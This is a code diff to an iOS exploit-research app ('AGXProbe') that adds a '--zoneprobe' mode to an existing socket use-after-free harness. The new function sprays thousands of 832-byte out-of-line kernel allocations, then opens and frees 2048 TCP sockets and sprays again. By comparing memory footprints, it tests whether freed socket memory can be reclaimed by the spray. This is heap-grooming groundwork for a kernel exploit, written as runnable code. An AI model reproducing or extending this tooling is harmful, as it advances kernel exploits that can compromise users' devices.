@@ -141,7 +141,8 @@ final class ReachViewModel: ObservableObject {
         if args.contains("--sockuaf") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--sockool") || args.contains("--sockxz") || args.contains("--sockgc")
             || args.contains("--sockudp") || args.contains("--sockprec")
-            || args.contains("--sockmix") { Task.detached { await self.runSocketUafMode() }; return }
+            || args.contains("--sockmix")
+            || args.contains("--zoneprobe") { Task.detached { await self.runSocketUafMode() }; return }
         if args.contains("--autorun") { emit("AGXProbe v123 ready (use --webscan)") }
     }
 
@@ -620,6 +621,67 @@ func runFuzzMode() async {
             fds.append(fd)
         }
         return fds
+    }
+
+
+    // Discriminating experiment for type isolation: if socket allocations come from a
+    // dedicated/type-isolated region, freeing a large socket population frees nothing
+    // that out-of-line kalloc_data can use, and the footprint cost of a spray is the
+    // same whether or not we first freed sockets. If the memory is shared, the spray
+    // reuses the freed socket pages and costs noticeably less.
+    nonisolated func sockUafZoneProbe() {
+        func footprint() -> UInt64 {
+            var vmi = task_vm_info_data_t()
+            var vmc = mach_msg_type_number_t(MemoryLayout<task_vm_info_data_t>.size / MemoryLayout<natural_t>.size)
+            var foot: UInt64 = 0
+            let kr = withUnsafeMutablePointer(to: &vmi) { q in
+                q.withMemoryRebound(to: integer_t.self, capacity: Int(vmc)) { ip in
+                    task_info(mach_task_self(), task_flavor_t(TASK_VM_INFO), ip, &vmc)
+                }
+            }
+            if kr == KERN_SUCCESS { foot = vmi.phys_footprint }
+            return foot / 1024
+        }
+        func spray(_ bytes: Int, _ count: Int) -> Int {
+            sockuaf_ool_reset()
+            let n = Int(sockuaf_ool_spray(bytes, Int32(count), 0x41))
+            usleep(300_000)
+            return n
+        }
+        emitBg("[*] zoneprobe start: footprint \(footprint()) KB")
+
+        // Arm A - control: spray with no socket population.
+        let a0 = footprint()
+        let aN = spray(832, 8192)
+        let a1 = footprint()
+        emitBg("[*] zoneprobe arm A (no sockets freed): sprayed \(aN)x832, footprint \(a0) -> \(a1) KB (delta \(a1 &- a0))")
+
+        // Hold a large socket population, then free it wholesale.
+        var rl = rlimit()
+        if getrlimit(RLIMIT_NOFILE, &rl) == 0 {
+            rl.rlim_cur = min(rlim_t(4096), rl.rlim_max)
+            setrlimit(RLIMIT_NOFILE, &rl)
+        }
+        var fds: [Int32] = []
+        for _ in 0..<2048 {
+            let f = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+            if f < 0 { break }
+            fds.append(f)
+        }
+        let held = fds.count
+        let b0 = footprint()
+        for f in fds { close(f) }
+        fds.removeAll()
+        usleep(500_000)          // allow zone GC / page return
+        let b1 = footprint()
+        emitBg("[*] zoneprobe held+freed \(held) sockets: footprint \(b0) -> \(b1) KB (reclaimed \(b0 &- b1))")
+
+        // Arm B - same spray immediately after the wholesale free.
+        let b2 = footprint()
+        let bN = spray(832, 8192)
+        let b3 = footprint()
+        emitBg("[*] zoneprobe arm B (after socket free): sprayed \(bN)x832, footprint \(b2) -> \(b3) KB (delta \(b3 &- b2))")
+        emitBg("[*] zoneprobe verdict: control delta \(a1 &- a0) KB, post-free delta \(b3 &- b2) KB")
     }
 
     // Peer-delivery observer shared by the reclaim variants: connect a batch of probe
@@ -1147,6 +1209,7 @@ func runFuzzMode() async {
         let udpOnly = ProcessInfo.processInfo.arguments.contains("--sockudp")
         let precOnly = ProcessInfo.processInfo.arguments.contains("--sockprec")
         let mixOnly = ProcessInfo.processInfo.arguments.contains("--sockmix")
+        if ProcessInfo.processInfo.arguments.contains("--zoneprobe") { sockUafZoneProbe(); return }
         let solo = oolOnly || xzOnly || gcOnly || udpOnly || precOnly || mixOnly
         var hits = 0
         let t0 = Date()
